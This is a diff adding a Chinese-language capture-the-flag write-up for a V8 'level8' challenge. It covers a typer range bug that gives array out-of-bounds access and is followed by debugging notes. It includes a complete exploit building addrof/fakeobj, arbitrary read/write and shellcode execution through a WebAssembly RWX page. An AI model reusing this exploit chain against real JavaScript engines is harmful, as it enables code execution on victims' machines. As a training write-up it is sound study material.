@@ -598,3 +598,125 @@ writeHeap4(addrOf(foo)+24,code+0x7a);
 foo();
 ```
 没错就这么简单……返回的double数组开头的1.0用来满足跳转到shellcode的条件
+
+## level8
+
+理论上这题需要在源码层面插入一些调试语句并自行编译v8，但我纯靠运气和苦力硬是虚空调试猜出来了（主要是因为大佬指出了怎么触发漏洞）
+
+patch提供的bug：如果v8 typer优化一个数字类型的变量成Range后Range的最小值为0，则我们可以拥有无限的数组oob
+
+在我做这道题之前，社区服务器里正好有人在讨论这题。引用`lau9098`的话：
+
+You need to cast the integer to SMI first using `x | 0`. `index = Math.max(index | 0, 0)` will set `index.min() == 0`. it would do it without the `x | 0` since it would infer `Math.max(Any, 0)`, and it should be `Math.max(SMI, 0)`
+
+以上就是触发bug的方法。实操中还需要满足上述操作所在的函数被优化的条件。好，就是这个条件卡了我很久。为了让数组的长度被推断成length_type，我需要将这个数组放到函数里面；但不知道为什么，这样会导致所在的函数不被优化。把数组放外面后函数倒是可以被优化，但v8就无法推断数组的length_type了（也有可能是因为数组可以被外部的代码访问，所以v8保守地推断成`Range(0,Inf)`？总之这样没法让`index_type.Min() < length_type.Min()`，因为`index_type.Min()`必须大于等于0）。所以我需要让数组既在函数外面又在函数里面……啊？
+
+很绝望地测试了几个小时
+
+在翻看之前的exp时突然有了个想法。我要是跟level6一样搞个函数内的函数会咋样？没想到这样成了。仍不知道为什么
+
+但是触发了oob还不够，需要在发生oob的数组后面再创建一个数组才好利用。我在发生oob的float数组后创建了个obj数组，然后测试float数组是否能读出来定义的元素之外的值，特别是obj数组里的结构。好消息：可以读出来神奇的浮点数；坏消息，没有obj数组里的元素。我都遍历到40个索引去了，什么乱七八糟的东西都有，就是没有obj数组里的元素。那我缺的addrof这块谁给我补啊？更绝望的是，我无法在函数里塞`%DebugPrint`查看内存结构，因为我需要将这个函数调用200000000次，一堆输出感觉会直接卡死我的终端。用`%OptimizeFunctionOnNextCall`强制优化？也不行，因为这玩意只优化函数，好像不推导`Range`；必须调用很多次函数从而提供足够的线索让d8推断（这块我不确定，但实操中确实发现单`%OptimizeFunctionOnNextCall`无法触发漏洞）。来吧，纯碰运气吧
+
+在观察越界获取的浮点数并将其与我熟知的数组结构比对时，我发现数据有错位的情况。于是我尝试多往float数组和obj数组塞几个元素，成了。我拿到了我心心念念的addrof。好吧，接下来搞fakeobj
+
+fakeobj又卡了我很久。到最后我累得半死，直接抄了addrof的实现并调换float数组和obj数组的顺序。成了。唉这到底是什么玩意，我到底在写什么
+
+等一下，做level7时好像发现没法连续优化两个函数？但我想了很久，真的想不到怎么只用一个函数实现addrof和fakeobj。后面又是抱着碰运气的想法，隔开了两个函数的for循环调用。这次d8乖乖地优化了两个函数……d8你开心就好
+```js
+RWX_PAGE_OFFSET=0x2c0a0n;
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
+}
+function itof(val) {
+    u64_buf[0] = Number(val & 0xffffffffn);
+    u64_buf[1] = Number(val >> 32n);
+    return f64_buf[0];
+}
+function shift32(i) {
+	return i << 32n;
+}
+function upperhalf(i) {
+	return i / 0x100000000n;
+}
+function optimize_me_please(index,addr,value,is_write) {
+  var another_one=[{"A":1},{"A":1},{"A":1}];
+  var float_arr = [73.31,1.3,1.4];
+  function bruh(){
+    let bounded = index | 0;
+    bounded = Math.max(bounded + 1, 0);
+    another_one[bounded]=addr;
+    if(is_write) another_one[0]=value;
+    return [another_one[bounded],float_arr];
+  }
+  return bruh();
+}
+function also_optimize_me_please(index,addr,value,is_write) {
+  var float_arr = [73.31,1.3,1.4];
+  var another_one=[{"A":1},{"A":1},{"A":1}];
+  function bruh(){
+    let bounded = index | 0;
+    bounded = Math.max(bounded + 1, 0);
+    float_arr[bounded]=addr;
+    if(is_write) float_arr[0]=value;
+    return [float_arr[bounded],another_one];
+  }
+  return bruh();
+}
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
+let shellcode_buf = new ArrayBuffer(shellcode.length * 4);
+var obj={"B":2};
+for (let i = 0; i < 200000000; i++) optimize_me_please(i % 2,obj,obj,true);
+function addrof(in_obj){
+  return upperhalf(ftoi(optimize_me_please(5,in_obj,in_obj,true)[1][0]));
+}
+let wasm_addr=addrof(wasm_instance);
+let buf_addr = addrof(shellcode_buf);
+console.log(wasm_addr);
+console.log(buf_addr);
+for (let i = 0; i < 200000000; i++) also_optimize_me_please(i % 2,3.3,3.3,true);
+function fakeobj(addr){
+  return also_optimize_me_please(9,itof(shift32(addr)+BigInt(addr)),obj,false)[1][0];
+}
+var arb_rw_arr = [itof(shift32(0x725n)+BigInt(0x1cb7f9)), 1.2];
+var arb_rw_arr_addr=addrof(arb_rw_arr);
+console.log(arb_rw_arr_addr);
+function arb_read(addr) {
+  arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+  let fake = fakeobj(addrof(arb_rw_arr)+0x18n);
+  return ftoi(fake[0]);
+}
+function arb_write(addr, val) {
+  arb_rw_arr[1]=itof(shift32(4n)+BigInt(addr-8n));
+  let fake = fakeobj(addrof(arb_rw_arr)+0x18n);
+  fake[0] = itof(BigInt(val));
+}
+var rwx_page_addr = arb_read(wasm_addr+RWX_PAGE_OFFSET);
+console.log(rwx_page_addr);
+let backing_store_addr = buf_addr + 0x24n;
+arb_write(backing_store_addr,rwx_page_addr);
+let dataview = new DataView(shellcode_buf);
+for (let i = 0; i < shellcode.length; i++) {
+	dataview.setUint32(4 * i, shellcode[i], true);
+}
+f();
+while(1){}
+```
+做这题的时候发现在pwndbg里运行exp会导致运行时间非常长，根本等不到输出。只能在外面自己运行d8然后pwndbg挂载
+
+虽然这题做得很痛苦且用了很长时间，但我竟然找不到什么可以总结的。很多卡了我很久的地方都是因为我没仔细看。比如我抄for循环时只改了一半，调用的是`also_optimize_me_please(i % 2,3.3,obj,true)`，这样会导致fakeobj失效；或者修改函数内部数组的长度后忘记改第一个参数了，诸如此类
+
+我甚至刚写完就不记得我痛苦的调试环节了，初步推断是太痛苦了大脑直接忘了（
+
+对了还有一点。pwndbg挂载的调试技巧有个弊端，就是必须得在脚本里塞点`while(1)`。在实际运行时自然要去掉这句。这又回到了老生常谈的话题：修改源码会导致偏移改变。问题是错误的`RWX_PAGE_OFFSET`会导致程序直接退出，完全没留给我重新挂载pwndbg的时间。我的解决方法如下：疯狂修改脚本无伤大雅的细节，通过运气使得错误的`RWX_PAGE_OFFSET`不会让程序崩溃。走到下面的`while(1)`后就能开开心心地挂载pwndbg了（如果这能被称之为解决办法的话）
+
+这是这个系列最后一个挑战了。累死我了。愿天堂没有v8，这么看下来连kernel都比这玩意稳定（
+
+那我接下来做kernel的题吧（？）
